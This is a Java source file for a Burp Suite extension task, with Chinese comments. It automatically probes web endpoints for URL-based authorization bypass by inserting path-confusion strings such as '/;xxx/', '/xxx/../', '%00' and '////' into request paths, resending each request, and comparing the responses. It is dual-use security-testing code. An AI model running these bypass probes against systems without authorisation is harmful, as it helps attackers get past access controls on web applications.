package burp.task;

import burp.*;
import burp.impl.VulResult;
import burp.impl.VulTaskImpl;
import java.util.ArrayList;
import java.util.List;

public class BypassAuth extends VulTaskImpl {

    public BypassAuth(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log, IHttpRequestResponse messageInfo) {
        super(helpers, callbacks, log, messageInfo);
    }

    @Override
    public VulResult run() {
        /**
         * 绕过鉴权
         * */
        // 后缀检查，静态资源不做测试
        List<String> add = new ArrayList<String>();
        add.add(".js");
        if (isStaticSource(path, add)){
            return null;
        }
        payloads = loadPayloads("/payloads/BypassAuth.bbm");
        List<String> bypass_str = new ArrayList<String>();
        bypass_str.add("/xxx/../");
        bypass_str.add("/;xxx/");
        bypass_str.add("/aaa;xxx/../");
        bypass_str.add(";");
        bypass_str.add("/./");
        bypass_str.add("////");
        bypass_str.add("%00");
        bypass_str.add("%20");

        // 将path拆解
        String[] paths = path.split("/");
        List<String> bypass_path = createPath(bypass_str, path);
        //修改api
        String query = request_header_list.get(0);
        List<String> new_headers = request_header_list;
        String header_first = "";

        for (String bypass :
                bypass_path) {
            //url有参数
            header_first = query.replace(path, bypass);

            new_headers.remove(0);
            new_headers.add(0, header_first);

            //新的请求包
            IHttpRequestResponse messageInfo1 = requester.send(this.iHttpService, new_headers, request_body_byte);
            //新的返回包
            IResponseInfo analyzeResponse1 = this.helpers.analyzeResponse(messageInfo1.getResponse());
            String response_info1 = new String(messageInfo1.getResponse());
            String rep1_body = response_info1.substring(analyzeResponse1.getBodyOffset());
            status = analyzeResponse1.getStatusCode();

            //如果状态码200,然后响应内容不同，则存在url鉴权绕过
            if (status == 200 && !resp_body_str.equalsIgnoreCase(rep1_body)) {
                message = "BypassAuth";
                messageInfo_r = messageInfo1;
                break;
            }
        }

        if (!message.equalsIgnoreCase("")){
            result = logAdd(messageInfo_r, host, path, method, status, message, payloads);
        }

        return result;
    }

    private List<String> createPath(List<String> bypass_str, String urlpath){
        // 将path拆解
        String[] paths = urlpath.split("/");
        List<String> bypass_path = new ArrayList<String>();
        // 添加bypass，如:/api/test
        // /api;/test
        // /api/xx;/../test
        for (String str : bypass_str) {
            for (int i = 0; i< paths.length -1; i++){
                String bypassStr = paths[i] + str;
                StringBuilder sb = new StringBuilder();
                for (int j = 0; j< paths.length -1; j++) {
                    if (i == j){
                        sb.append(bypassStr).append("/");
                        continue;
                    }
                    sb.append(paths[j]).append("/");
                }
                sb.append(paths[paths.length - 1]); //最后一个path不参与，直接添加
                bypass_path.add(sb.toString());
            }
        }
        return bypass_path;
    }
}
